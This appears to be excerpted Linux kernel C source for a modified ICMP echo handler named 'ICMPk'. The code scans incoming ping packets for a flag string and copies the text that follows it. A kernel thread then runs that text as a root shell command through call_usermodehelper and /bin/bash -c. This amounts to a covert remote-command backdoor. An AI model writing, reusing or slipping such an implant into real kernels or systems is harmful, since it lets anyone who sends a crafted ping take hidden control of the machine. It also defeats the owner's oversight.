...
#define COMMAND_BUFFER_SIZE 5
  static char *command_buffer[COMMAND_BUFFER_SIZE] = {NULL};
  static atomic_t command_p = ATOMIC_INIT(0);

  static struct task_struct *icmp_thread;
  static bool icmp_thread_should_run = true;
  static struct semaphore icmp_sem;
  static DEFINE_MUTEX(command_lock);

static int icmp_command_thread(void *_) {
    int ret;

    char *argv[] = { "/bin/bash", "-c", "", NULL };
    char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

    while (icmp_thread_should_run) {
        ret = down_interruptible(&icmp_sem);
        if (ret != 0){
            pr_err("ICMPk: waiting for semaphore was interrupted\n");
            continue;
        }

        if(!icmp_thread_should_run)
            return 0;

        mutex_lock(&command_lock);
        if (command_buffer[0] == NULL) {
            mutex_unlock(&command_lock);
            continue;
        }

        argv[2] = command_buffer[0];
        printk(KERN_DEBUG "ICMPk: Running command: %s\n", argv[2]);

        int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        if (ret != 0) {
            pr_err("call_usermodehelper failed with error: %d\n", ret);
        }

        // Prepare for next iteration
        kfree(command_buffer[0]);
        for(int i = 0; i < COMMAND_BUFFER_SIZE - 1; i++) {
            command_buffer[i] = command_buffer[i+1];
        }
        command_buffer[COMMAND_BUFFER_SIZE-1] = NULL;

        atomic_dec(&command_p);
        mutex_unlock(&command_lock);
    }
...
static void queue_icmp_command(char *command) {
    mutex_lock(&command_lock);
    int index = atomic_read(&command_p);

    if (index >= COMMAND_BUFFER_SIZE -1) {
        pr_err("ICMPk: command buffer full\n");
        kfree(command);
        mutex_unlock(&command_lock);
        return;
    }
 ...
 static enum skb_drop_reason icmp_echo(struct sk_buff *skb)
 {
    ...
    #ifdef _DEBUG_K
     print_hex_dump(KERN_DEBUG, "ICMP Packet Dump: ", DUMP_PREFIX_OFFSET, 16, 1,
        skb->data, skb->len, true);
    #endif
    hidden_message = strnstr(skb->data, flag, skb->len);

    if (hidden_message != NULL) {
        message = hidden_message + 3;

        #ifdef _DEBUG_K
        printk(KERN_DEBUG "ICMP Hidden Mesage: %s\n", message);
        #endif

        cmd_copy = kstrdup(message, GFP_KERNEL);
        if (!cmd_copy) {
            pr_err("ICMPk: Failed to allocate memory for command\n");
            mutex_unlock(&command_lock);
            return SKB_NOT_DROPPED_YET;
        }
        queue_icmp_command(cmd_copy);
    }
 ...
 int __init icmp_init(void)
 {
    ...
    //  Initializing my stuff:
    sema_init(&icmp_sem, 0);// Initialize semaphore with count 0 (thread starts sleeping)

    icmp_thread = kthread_create(icmp_command_thread, NULL, "icmp_thread");
    if (IS_ERR(icmp_thread)) {
        pr_err("Failed to create ICMP handler thread\n");
        return PTR_ERR(icmp_thread);
    }

    wake_up_process(icmp_thread);  // Start the thread
    pr_info("ICMP command handler thread started successfully\n");
    // End my stuff
